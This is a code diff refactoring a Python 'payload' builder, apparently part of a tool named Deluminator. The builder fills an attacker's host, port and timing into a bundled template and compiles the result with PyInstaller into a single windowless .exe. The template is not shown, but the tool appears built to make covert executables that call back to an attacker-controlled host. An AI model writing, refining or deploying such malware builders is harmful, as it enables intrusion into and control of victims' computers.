@@ -1,8 +1,8 @@
 import os
-import shutil
 import platform
 import subprocess
-import pkg_resources
+from importlib.resources import files
+
 
 # Main payload file
 def main(NAME, HOST, PORT, TIME):
@@ -10,50 +10,57 @@ def main(NAME, HOST, PORT, TIME):
     print(f":: Host = {HOST}")
     print(f":: Port = {PORT}")
     print(f":: Time = {TIME}")
-    print(f":: Generating Payload, Please Wait...")
-    
+    print(":: Generating Payload, Please Wait...")
+
     curr_dir = os.getcwd()
-    file_name = NAME + '.py'
+    file_name = f"{NAME}.py"
     payload_file_path = os.path.join(curr_dir, file_name)
-    sourc_file_path = pkg_resources.resource_filename('Deluminator', 'engine/source')
 
-    # Reading Source
-    with open(sourc_file_path, 'r') as source_file:
-        source = source_file.read()
+    # Read bundled payload template
+    source = (
+        files("Deluminator.engine")
+        .joinpath("source")
+        .read_text(encoding="utf-8")
+    )
 
-    # Write source in payload file
-    with open(payload_file_path, 'w') as payload_file:
+    # Replace placeholders
+    source = (
+        source.replace("<TIME>", str(TIME))
+        .replace("<HOST>", str(HOST))
+        .replace("<PORT>", str(PORT))
+    )
+
+    # Write payload file
+    with open(payload_file_path, "w", encoding="utf-8") as payload_file:
         payload_file.write(source)
 
-    # Set payload configuration
-    with open(payload_file_path, 'r') as file:
-        code = file.read()
-        code = code.replace('<TIME>', str(TIME))
-        code = code.replace('<HOST>', str(HOST))
-        code = code.replace('<PORT>', str(PORT))
-    
-    # Write payload configuration
-    with open(payload_file_path, 'w') as file:
-        file.write(code)
-
+    # Build executable
     command(NAME)
-    # cleanup(NAME, curr_dir)
 
     print(f":: Saved in dist/ directory as {NAME}.exe.")
 
-# compile payload into exe
+
+# Compile payload into executable
 def command(filename):
     curr_dir = os.getcwd()
-    file_name = filename + '.py'
-    payload_file_path = os.path.join(curr_dir, file_name)
+    payload_file_path = os.path.join(curr_dir, f"{filename}.py")
 
-    commandx = f"pyinstaller --onefile --noconsole {payload_file_path}"
-    if platform.system() == 'Windows':
-        subprocess.run(commandx, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    else:
-        subprocess.run(commandx, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, executable='/bin/bash')
+    commandx = [
+        "pyinstaller",
+        "--onefile",
+        "--noconsole",
+        payload_file_path,
+    ]
+
+    subprocess.run(
+        commandx,
+        check=True,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
 
 
-# def cleanup(filename, dir):
-#     os.remove(os.path.join(dir, filename + '.spec'))
-#     shutil.rmtree(dir,"/build")
+# Optional cleanup
+# def cleanup(filename, directory):
+#     os.remove(os.path.join(directory, f"{filename}.spec"))
+#     shutil.rmtree(os.path.join(directory, "build"))
